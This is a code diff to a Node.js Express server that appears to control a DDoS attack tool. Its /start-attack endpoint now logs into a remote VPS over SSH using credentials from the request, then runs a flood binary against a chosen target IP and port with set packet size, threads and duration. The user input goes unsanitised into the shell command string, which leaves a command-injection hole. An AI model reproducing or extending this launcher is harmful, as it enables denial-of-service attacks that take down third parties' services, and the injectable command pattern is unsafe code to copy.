@@ -61,33 +61,59 @@ app.post('/setup-vps', (req, res) => {
 
 // Endpoint to start attack
 app.post('/start-attack', (req, res) => {
-    const { ip, port, duration } = req.body;
+    const { ip, username, password, targetIp, targetPort, duration } = req.body;
 
     if (!isVPSSetup) {
         return res.status(400).json({ message: 'VPS not set up!' });
     }
 
-    if (!ip || !port || !duration) {
-        return res.status(400).json({ message: 'IP, port, and duration are required!' });
+    if (!ip || !username || !password || !targetIp || !targetPort || !duration) {
+        return res.status(400).json({ message: 'All fields are required!' });
     }
 
     if (duration > 180) {
         return res.status(400).json({ message: 'Duration must be 180 seconds or less!' });
     }
 
-    // Execute the binary with predefined packet_size and threads
-    const command = `./${BINARY_NAME} ${ip} ${port} ${duration} ${PACKET_SIZE} ${THREADS}`;
-    exec(command, (error, stdout, stderr) => {
-        if (error) {
-            console.error('Error executing binary:', error);
-            return res.status(500).json({ message: 'Attack failed!' });
-        }
-        console.log('Binary output:', stdout);
-        res.status(200).json({ message: 'Attack finished!' });
+    const conn = new Client();
+    conn.on('ready', () => {
+        console.log('SSH Connection Established');
+
+        // Execute the binary on the VPS
+        const command = `./${BINARY_NAME} ${targetIp} ${targetPort} ${duration} ${PACKET_SIZE} ${THREADS}`;
+        conn.exec(command, (err, stream) => {
+            if (err) {
+                console.error('Error executing command:', err);
+                res.status(500).json({ message: 'Attack failed!' });
+                return;
+            }
+
+            stream.on('close', (code, signal) => {
+                console.log(`Command exited with code ${code} and signal ${signal}`);
+                conn.end();
+                if (code === 0) {
+                    res.status(200).json({ message: 'Attack finished!' });
+                } else {
+                    res.status(500).json({ message: 'Attack failed!' });
+                }
+            }).on('data', (data) => {
+                console.log('Command output:', data.toString());
+            }).stderr.on('data', (data) => {
+                console.error('Command error:', data.toString());
+            });
+        });
+    }).on('error', (err) => {
+        console.error('SSH Connection Error:', err);
+        res.status(500).json({ message: 'Failed to connect to VPS!' });
+    }).connect({
+        host: ip,
+        port: 22,
+        username: username,
+        password: password,
     });
 });
 
 const PORT = process.env.PORT || 3000; // Use Render's PORT or default to 3000
-app.listen(PORT, () => {
+app.listen(PORT, '0.0.0.0', () => {
     console.log(`Server running on http://localhost:${PORT}`);
 });
